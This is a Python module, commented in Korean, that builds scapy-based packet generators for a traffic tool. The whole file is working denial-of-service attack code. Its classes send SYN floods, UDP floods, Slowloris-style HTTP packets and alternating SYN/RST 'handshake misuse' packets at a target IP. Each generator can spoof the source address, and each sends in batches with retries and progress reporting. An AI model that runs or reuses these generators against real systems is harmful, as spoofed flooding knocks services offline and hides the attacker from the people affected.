# -*- coding: utf-8 -*-

"""
패킷 생성 베이스 모듈

TrafficGeneratorApp의 패킷 생성 함수들에서 공통으로 사용되는 기능 제공
"""

import time
import random
import threading
from abc import ABC, abstractmethod
from scapy.all import *
from .network_interface_manager import get_interface_manager

class PacketGeneratorBase(ABC):
    """패킷 생성기 베이스 클래스"""
    
    def __init__(self, target_ip, packet_count, packet_size, stop_flag, 
                 spoof_ip=None, progress_callback=None):
        self.target_ip = target_ip
        self.packet_count = packet_count  
        self.packet_size = packet_size
        self.stop_flag = stop_flag
        self.spoof_ip = spoof_ip
        self.progress_callback = progress_callback
        
        # 네트워크 인터페이스 관리자
        self.interface_manager = get_interface_manager()
        
        # 공통 설정
        self.batch_size = 50
        self.max_retries = 3
        self.retry_delay = 0.1
        self.packet_delay = 0.001
        
        # 상태 추적
        self.sent_count = 0
        self.error_count = 0
        self.is_initialized = False
        
    def initialize(self):
        """패킷 생성 전 초기화"""
        if self.is_initialized:
            return True
            
        try:
            # 네트워크 인터페이스와 IP 확인
            self.iface, self.src_ip = self.interface_manager.get_active_interface_and_ip()
            if not self.iface:
                raise Exception("네트워크 인터페이스를 찾을 수 없습니다.")
            
            # IP 스푸핑 설정
            if self.spoof_ip and self._is_valid_ip(self.spoof_ip):
                self.src_ip = self.spoof_ip
                print(f"IP 스푸핑 활성화: {self.spoof_ip}")
            
            # ARP 테이블 미리 채우기
            self._populate_arp_table()
            
            self.is_initialized = True
            return True
            
        except Exception as e:
            print(f"❌ 패킷 생성기 초기화 실패: {e}")
            return False
    
    def generate_packets(self):
        """패킷 생성 메인 메서드"""
        if not self.initialize():
            return False
            
        print(f"{self.get_attack_name()} 시작 - 인터페이스: {self.iface}, "
              f"소스 IP: {self.src_ip}, 패킷 수: {self.packet_count}")
        
        packets = []
        
        for i in range(self.packet_count):
            if self.stop_flag.is_set():
                break
                
            try:
                # 개별 패킷 생성 (추상 메서드)
                packet = self.create_packet(i)
                if packet:
                    packets.append(packet)
                
                # 배치 크기마다 전송
                if len(packets) >= self.batch_size or i == self.packet_count - 1:
                    if self._send_packet_batch(packets, i):
                        packets.clear()
                    else:
                        # 전송 실패 시 재시도 또는 중단
                        if self.error_count >= self.max_retries:
                            print(f"❌ {self.max_retries}번 연속 실패로 {self.get_attack_name()} 중단")
                            break
                        packets.clear()
                    
                    # 시스템 부하 감소를 위한 대기
                    if i < self.packet_count - 1:
                        time.sleep(self.packet_delay)
                        
            except Exception as e:
                print(f"❌ 패킷 생성 중 오류: {e}")
                self.error_count += 1
                if self.error_count >= self.max_retries:
                    break
        
        # 정리 작업
        self._cleanup()
        print(f"{self.get_attack_name()} 완료 - 총 {self.sent_count}개 패킷 전송")
        return True
    
    def _send_packet_batch(self, packets, current_index):
        """패킷 배치 전송"""
        try:
            send(packets, iface=self.iface, verbose=0, inter=0, realtime=False)
            self.sent_count += len(packets)
            self.error_count = 0  # 성공 시 에러 카운터 리셋
            
            # 진행률 콜백 호출
            if self.progress_callback:
                progress = int((current_index + 1) / self.packet_count * 100)
                self.progress_callback.emit(
                    f"{self.get_attack_name()} 진행률: {progress}% "
                    f"({self.sent_count}/{self.packet_count}) - 인터페이스: {self.iface}"
                )
            
            # 로그 출력 (매 500개마다)
            if self.sent_count % 500 == 0 or current_index == self.packet_count - 1:
                print(f'✅ {self.sent_count}개 {self.get_attack_name()} 패킷 전송 완료 '
                      f'({current_index + 1}/{self.packet_count}) via {self.iface}')
            
            return True
            
        except Exception as e:
            self.error_count += 1
            error_msg = (f'❌ 패킷 전송 중 오류 (배치 {self.sent_count//self.batch_size + 1}): '
                        f'{str(e)}')
            print(error_msg)
            
            # 진행률 콜백에도 오류 정보 전달
            if self.progress_callback:
                self.progress_callback.emit(f"{self.get_attack_name()} 오류: {str(e)} - 재시도 중...")
            
            # 에러 발생 시 잠시 대기
            time.sleep(self.retry_delay)
            return False
    
    def _populate_arp_table(self):
        """ARP 테이블 미리 채우기"""
        print("🔄 ARP 테이블 준비 중...")
        try:
            # ARP 요청 전송
            arp_request = ARP(pdst=self.target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # 응답 대기 (조용히)
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                for element in answered_list:
                    mac_address = element[1].hwsrc
                    print(f"✅ ARP 엔트리 추가: {self.target_ip} -> {mac_address}")
                    return
            else:
                # 게이트웨이를 통한 통신이 필요한 경우
                gateway = self.interface_manager.get_default_gateway()
                if gateway and gateway != self.target_ip:
                    print(f"🔄 게이트웨이 {gateway}를 통한 통신 준비")
                    
        except Exception:
            # ARP 실패는 조용히 넘어감 (정상적인 상황일 수 있음)
            pass
    
    def _cleanup(self):
        """정리 작업"""
        import gc
        gc.collect()
    
    def _is_valid_ip(self, ip):
        """IP 주소 유효성 검사"""
        import socket
        try:
            socket.inet_pton(socket.AF_INET, ip)
            return True
        except socket.error:
            try:
                socket.inet_pton(socket.AF_INET6, ip)
                return True
            except socket.error:
                return False
    
    @abstractmethod
    def create_packet(self, index):
        """개별 패킷 생성 (서브클래스에서 구현)"""
        pass
    
    @abstractmethod 
    def get_attack_name(self):
        """공격 이름 반환 (서브클래스에서 구현)"""
        pass


class SynFloodGenerator(PacketGeneratorBase):
    """SYN 플러드 패킷 생성기"""
    
    def create_packet(self, index):
        """SYN 패킷 생성"""
        sport = random.randint(1024, 65535)
        dport = random.randint(1, 65535)
        payload_size = max(0, self.packet_size - 20 - 20 - 14)  # IP(20) + TCP(20) + Ethernet(14)
        
        return IP(src=self.src_ip, dst=self.target_ip) / \
               TCP(sport=sport, dport=dport, flags='S') / \
               Raw(load='X' * payload_size)
    
    def get_attack_name(self):
        return "SYN 플러드"


class UdpFloodGenerator(PacketGeneratorBase):
    """UDP 플러드 패킷 생성기"""
    
    def create_packet(self, index):
        """UDP 패킷 생성"""
        sport = random.randint(1024, 65535)
        dport = random.randint(1, 65535)
        payload_size = max(0, self.packet_size - 20 - 8 - 14)  # IP(20) + UDP(8) + Ethernet(14)
        
        return IP(src=self.src_ip, dst=self.target_ip) / \
               UDP(sport=sport, dport=dport) / \
               Raw(load='X' * payload_size)
    
    def get_attack_name(self):
        return "UDP 플러드"


class HttpSlowlorisGenerator(PacketGeneratorBase):
    """HTTP Slowloris 패킷 생성기"""
    
    def create_packet(self, index):
        """HTTP Slowloris 패킷 생성"""
        sport = random.randint(1024, 65535)
        
        # 부분적인 HTTP 요청 생성
        http_headers = [
            "GET / HTTP/1.1",
            f"Host: {self.target_ip}",
            "User-Agent: Mozilla/5.0",
            "Accept: text/html",
            "Connection: keep-alive",
            f"X-Header-{index}: {'X' * min(50, index % 100)}"
        ]
        http_payload = "\r\n".join(http_headers)
        
        return IP(src=self.src_ip, dst=self.target_ip) / \
               TCP(sport=sport, dport=80, flags='PA') / \
               Raw(load=http_payload)
    
    def get_attack_name(self):
        return "HTTP Slowloris"


class TcpHandshakeMisuseGenerator(PacketGeneratorBase):
    """TCP 핸드셰이크 오용 패킷 생성기"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.syn_packets = []
        self.rst_packets = []
    
    def create_packet(self, index):
        """TCP 핸드셰이크 오용 패킷 생성"""
        sport = random.randint(1024, 65535)
        dport = random.randint(1, 65535)
        payload_size = max(0, self.packet_size - 20 - 20 - 14)
        
        # SYN과 RST 패킷을 번갈아 생성
        if index % 2 == 0:
            return IP(src=self.src_ip, dst=self.target_ip) / \
                   TCP(sport=sport, dport=dport, flags='S') / \
                   Raw(load='X' * payload_size)
        else:
            return IP(src=self.src_ip, dst=self.target_ip) / \
                   TCP(sport=sport, dport=dport, flags='R')
    
    def get_attack_name(self):
        return "TCP 핸드셰이크 오용"


# 팩토리 함수들 (기존 함수와 호환성 유지)
def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, progress_callback=None):
    """SYN 플러드 공격 (호환성 함수)"""
    generator = SynFloodGenerator(target_ip, packet_count, packet_size, stop_flag, 
                                 spoof_ip, progress_callback)
    return generator.generate_packets()

def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, progress_callback=None):
    """UDP 플러드 공격 (호환성 함수)"""
    generator = UdpFloodGenerator(target_ip, packet_count, packet_size, stop_flag,
                                 spoof_ip, progress_callback)
    return generator.generate_packets()

def http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    """HTTP Slowloris 공격 (호환성 함수)"""
    generator = HttpSlowlorisGenerator(target_ip, packet_count, packet_size, stop_flag, spoof_ip)
    return generator.generate_packets()

def tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    """TCP 핸드셰이크 오용 공격 (호환성 함수)"""
    generator = TcpHandshakeMisuseGenerator(target_ip, packet_count, packet_size, stop_flag, spoof_ip)
    return generator.generate_packets() 